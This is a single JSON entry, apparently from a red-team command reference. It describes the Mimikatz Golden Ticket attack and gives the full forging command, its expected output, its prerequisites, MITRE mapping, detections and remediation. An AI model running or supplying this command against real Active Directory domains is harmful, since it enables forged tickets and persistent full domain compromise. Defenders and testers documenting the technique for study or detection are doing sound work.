  {
    "id": "golden-ticket",
    "tool": "mimikatz",
    "category": "active_directory",
    "phase": 4,
    "os": [
      "windows"
    ],
    "command": "mimikatz # kerberos::golden /user:fakeadmin /domain:corp.local /sid:S-1-5-21-... /krbtgt:<ntlm_hash> /ptt",
    "name": "Golden Ticket Attack",
    "description": "Forges Kerberos TGT using krbtgt hash \u2014 unlimited domain access for 10 years.",
    "arguments": {
      "/krbtgt": "krbtgt NTLM hash",
      "/ptt": "Pass the ticket"
    },
    "expected_output": "[*] Golden ticket for 'fakeadmin @ corp.local' successfully submitted for current session",
    "use_case": "Forge TGT for any user \u2014 complete domain compromise. Persists until krbtgt password changed twice.",
    "prerequisites": [
      "krbtgt NTLM hash (from DCSync)"
    ],
    "mitre_mapping": [
      "T1558.001"
    ],
    "mitre_tactic": "Persistence",
    "detections": [
      "TGT with unusual lifetime",
      "Non-existent user in TGT"
    ],
    "remediation": [
      "Change krbtgt password twice",
      "Monitor for anomalous tickets"
    ],
    "common_mistakes": [
      "krbtgt hash not available"
    ],
    "alternatives": [
      "silver ticket (per-service)"
    ],
    "references": [
      "https://adsecurity.org/?p=1640"
    ],
    "tags": [
      "golden-ticket",
      "krbtgt",
      "persistence",
      "kerberos",
      "forge"
    ]
  },
